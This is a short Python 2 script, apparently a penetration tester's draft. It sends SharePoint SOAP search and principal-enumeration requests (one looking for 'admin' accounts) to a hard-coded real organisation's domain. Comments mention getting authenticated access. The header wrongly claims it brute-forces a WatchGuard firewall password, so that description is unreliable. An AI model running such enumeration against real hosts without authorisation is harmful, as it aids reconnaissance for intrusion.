#!/usr/bin/python
# Copyright 2011 Stephen Haywood aka AverageSecurityGuy
#
#   This program is free software: you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation, either version 3 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# firewarebf.py attempts to bruteforce the password on a Watchguard firewall.

import urllib2
import urllib
import ssl
import xml.sax.saxutils

#-----------------------------------------------------------------------------
# Functions
#-----------------------------------------------------------------------------
def sharepoint_soap_request(domain, page, data, action):
    url = 'http://'  + domain + page

    #encoded = data.encode('utf-8')
    #print encoded
    headers = {'Host' : domain,
              'Content-Type' : 'text/xml; charset=utf-8',
              'Content-Length' : len(data),
              'SOAPAction' : action}

    try:
        req = urllib2.Request(url, data, headers)
        print str(req.headers)
        resp = urllib2.urlopen(req).read()
    except urllib2.HTTPError, e:
        print "HTTPError ({0}): {1}".format(e.code, e.msg)
    else:
        print resp


#-----------------------------------------------------------------------------
# Main Program
#-----------------------------------------------------------------------------

domain = 'www.hollandbpw.com'

'''
action = 'http://schemas.microsoft.com/sharepoint/soap/SearchPrincipals'
data =  '<?xml version="1.0" encoding="utf-8"?>'
data += '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
data += '<soap:Body>'
data += '<SearchPrincipals xmlns="http://schemas.microsoft.com/sharepoint/soap/">'
data += '<searchText>admin</searchText>'
data += '<maxResults>100</maxResults>'
data += '<principalType>All</principalType>'
data += '</SearchPrincipals>'
data += '</soap:Body>'
data += '</soap:Envelope>'

sharepoint_soap_request(domain, data, action)
'''

search_page = '/_vti_bin/search.asmx'
action = 'urn:Microsoft.Search/Query'

#------------------------------------------------------------------------------
# How do I put in the cookie so I can query as an authenticated user?
# Look at the other things I can access.
#------------------------------------------------------------------------------
search_string =  '<QueryPacket xmlns="urn:Microsoft.Search.Query" Revision="1000">'
search_string += '<Query domain="QDomain">'
search_string += '<SupportedFormats>'
search_string += '<Format>urn:Microsoft.Search.Response.Document.Document</Format>'
search_string += '</SupportedFormats>'
search_string += '<Context>'
search_string += '<QueryText language="en-US" type="STRING">City:"Austin"</QueryText>'
search_string += '</Context>'
search_string += '</Query>'
search_string += '</QueryPacket>'

query = xml.sax.saxutils.escape(search_string)


data =  '<?xml version="1.0" encoding="utf-8"?>'
data += '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
data += '<soap:Body>'
data += '<Query xmlns="urn:Microsoft.Search">'
data += '<queryXml>' + query + '</queryXml>'
data += '</Query>'
data += '</soap:Body>'
data += '</soap:Envelope>'

sharepoint_soap_request(domain, search_page, data, action)
